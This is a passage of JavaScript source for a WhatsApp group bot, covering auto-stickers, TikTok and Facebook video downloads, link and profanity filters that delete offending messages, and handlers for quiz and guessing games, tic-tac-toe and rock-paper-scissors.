        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    reply(`This feature is for premium users, contact the owner to become a premium user`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await NanoBotz.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await NanoBotz.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
if (
  budy.startsWith('https://vt.tiktok.com/') || 
  budy.startsWith('https://www.tiktok.com/') || 
  budy.startsWith('https://t.tiktok.com/') || 
  budy.startsWith('https://vm.tiktok.com/')
) {
  NanoBotz.sendMessage(m.chat, { react: { text: `🚹`, key: m.key }})
  try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`);
    const vidnya = data?.video?.noWatermark;
    if (vidnya) {
      const caption = `*[ TIKTOK DOWNLOADER ]*
*Videos from*: _${data.author?.name ?? 'Unknown'} (@${data.author?.unique_id ?? 'Unknown'})_
*Likes*: _${data.stats?.likeCount ?? 'Unknown'}_
*Comments*: _${data.stats?.commentCount ?? 'Unknown'}_
*Shares*: _${data.stats?.shareCount ?? 'Unknown'}_
*Plays*: _${data.stats?.playCount ?? 'Unknown'}_
*Saves*: _${data.stats?.saveCount ?? 'Unknown'}_
*Title*: _${data.title ?? 'Unknown'}_

\`⏤͟͟͞͞ Downloader By ${botname}\``;

      await NanoBotz.sendMessage(
        m.chat, 
        { caption, video: { url: vidnya } }, 
        { quoted: m }
      );
    } else {
      const nyut = await NanoTTDL(budy);
      await NanoBotz.sendMessage(
        m.chat, 
        {
          caption: `Title: ${nyut.title ?? 'Unknown'}\nDescription: ${nyut.description ?? 'Unknown'}`,
          video: { url: nyut.downloadLink || nyut.hdDownloadLink },
        },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    reply('Sorry, an error occurred while processing your request.');
  }
}
//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replynano('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    NanoBotz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replynano('Maybe private video!')
  }

}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
NanoBotz.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
NanoBotz.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !DanzTheCreator && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return;
            }
        }
        // Private Only
        if (!DanzTheCreator && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
        let gclink = (`https://chat.whatsapp.com/`+await NanoBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n You will not be kicked by bots because what you sent was a link to this group`})
        if (isAdmins) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin sends a link, admin is free to post any link`})
        if (DanzTheCreator) return NanoBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner has sent a link, owner is free to post any link`})
        kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			NanoBotz.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully removed`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			NanoBotz.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully removed`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully removed`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
          await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			NanoBotz.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
			
  }
  }
//anti bad words by xeon
if (antiToxic)
if (budy.includes("kontol") || budy.includes("kntl")) {
if (m.text) {
bvl = `Don't be toxic `
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await 
			
NanoBotz.sendMessage(from, {text:`Don't be toxic `, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin sends a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for sending a telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin sends TikTok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting tiktok links in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a Twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (!m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting a twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

NanoBotz.family100 = NanoBotz.family100 ? NanoBotz.family100 : {};
if (from in NanoBotz.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = NanoBotz.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replynano('A little again!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Question:* ${room.soal}

Available ${room.jawaban.length} answer${room.jawaban.find(v => v.includes(' ')) ? `
(some answers have spaces)
`: ''}
${isWin ? `*All answers are answered 🚹*` : isSurrender ? '*GIVE UP ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money every answer is correct`}
    `.trim();

    NanoBotz.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        NanoBotz.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete NanoBotz.family100[id];
    }
}
NanoBotz.tebaklagu = NanoBotz.tebaklagu ? NanoBotz.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   NanoBotz.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/5wsWcjp.jpeg' }, caption: `🎮 Guess the song 🎮\n\nCorrect answer 🎉\n\nWant to play again?Please type the song`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Wrong answer!*')
}

NanoBotz.tebakkata = NanoBotz.tebakkata ? NanoBotz.tebakkata : {}  
if (from in NanoBotz.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Guess the word 🎮\n\nCorrect answer 🎉\nPresent : 10.000 money\n`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tebakkata[id][2])
 delete NanoBotz.tebakkata[id]
} else console.log('*Wrong answer!*')
}
NanoBotz.tebakgambar = NanoBotz.tebakgambar ? NanoBotz.tebakgambar : {} 
if(from in NanoBotz.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Guess the picture 🎮\n\nCorrect answer 🎉\nPresent : 10.000 money\n\nWant to play again?Please type guessing`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tebakgambar[id][3])
 delete NanoBotz.tebakgambar[id]
} else console.log('*Wrong answer!*')
}

NanoBotz.tebakbendera2 = NanoBotz.tebakbendera2 ? NanoBotz.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "surrender") {
await replynano('*You have given up*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Guess the flag 🎮\n\nCorrect answer 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Wrong answer!*')
        }
NanoBotz.tebakbendera = NanoBotz.tebakbendera ? NanoBotz.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "surrender") {
await replynano('*You have given up*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Guess the picture 🎮\n\nCorrect answer 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Wrong answer!*')
        }
NanoBotz.tebakkabupaten = NanoBotz.tebakkabupaten ? NanoBotz.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "surrender") {
await replynano('*You have given up*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Guess Regency🎮\n\nCorrect answer 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Wrong answer!*')
        }
 NanoBotz.tebakkimia = NanoBotz.tebakkimia ? NanoBotz.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "surrender") {
await replynano('*You have given up*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 Guess Chemistry 🎮\n\nCorrect answer 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Wrong answer!*')
        }
        
//=========================================\\
NanoBotz.tekateki = NanoBotz.tekateki ? NanoBotz.tekateki : {}  
if(from in NanoBotz.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(NanoBotz.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.tekateki[id][2]
 var teks = `*Lazy*\n\nYour answer is right!\n Present : +${NanoBotz.tekateki[id][2]} Money 💸`
 replynano(`${teks}`)
 clearTimeout(NanoBotz.tekateki[id][3])
 delete NanoBotz.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A little more!*`)
}
//=========================================\\
NanoBotz.tebakasahotak = NanoBotz.tebakasahotak ? NanoBotz.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "surrender") {
await replynano('*You have given up*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await NanoBotz.sendText(m.chat, `🎮 The brain of the brain 🎮\n\nCorrect answer🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Wrong answer!*')
        }
//=========================================\\
        NanoBotz.siapaaku = NanoBotz.siapaaku ? NanoBotz.siapaaku : {}
if(from in NanoBotz.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(NanoBotz.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.siapaaku[id][2]
var teks = `*Who am I?*\n\nYour answer is right!\n Present : +${NanoBotz.siapaaku[id][2]} Money 💸`
   replynano(`${teks}`)
 clearTimeout(NanoBotz.siapaaku[id][3])
 delete NanoBotz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A little more!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        NanoBotz.susunkata = NanoBotz.susunkata ? NanoBotz.susunkata : {}  
if(from in NanoBotz.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(NanoBotz.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += NanoBotz.susunkata[id][2]
   var teks = `*Word arrange game*\n\nYour answer is right!\n Present : +${NanoBotz.susunkata[id][2]} Money 💸`
replynano(`${teks}`)
 clearTimeout(NanoBotz.susunkata[id][3])
 delete NanoBotz.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A little again!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
NanoBotz.caklontong = NanoBotz.caklontong ? NanoBotz.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/5wsWcjp.jpeg' }, caption: `🎮 Guess rice cake 🎮\n\nCorrect answer 🎉\n\nWant to play again?Please type guessing rice cake`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Wrong answer!*')
}
NanoBotz.tebakkalimat = NanoBotz.tebakkalimat ? NanoBotz.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/5wsWcjp.jpeg' }, caption: `🎮 Guess the sentence 🎮\n\nCorrect answer 🎉\n\nWant to play again?Please type the sentence`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Wrong answer!*')
}

//=========================================//
NanoBotz.tebaklirik = NanoBotz.tebaklirik ? NanoBotz.tebaklirik : {}  
if(from in NanoBotz.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(NanoBotz.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += NanoBotz.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*Guess Game Lyrics*\n\nYour answer is right!\n Present : +${NanoBotz.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replynano(`${teks}`)
 clearTimeout(NanoBotz.tebaklirik[id][3])
 delete NanoBotz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A little more!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
NanoBotz.tebaktebakan = NanoBotz.tebaktebakan ? NanoBotz.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Riddles 🎮\n\nCorrect answer 🎉\n\nWant to play again?Please type guess guess`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Wrong answer!*')
}
//antilink all by Dansya
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin Send Link,\n Admin is free 🗿☕`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await NanoBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
NanoBotz.sendMessage(from, {text:`\`\`\`「 The link is detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has sent a link and was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
NanoBotz.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: NanoBotz.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NanoBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
NanoBotz.ev.emit('messages.upsert', msg)
}
 
switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replynano(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await NanoBotz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await NanoBotz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replynano('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            NanoBotz.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replynano(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replynano('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replynano(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replynano(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replynano(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replynano(`The person you are challenging is playing according to someone else:(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            this.suit[id] = {
            chat: await NanoBotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) NanoBotz.sendText(m.chat, `_suit waktu habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
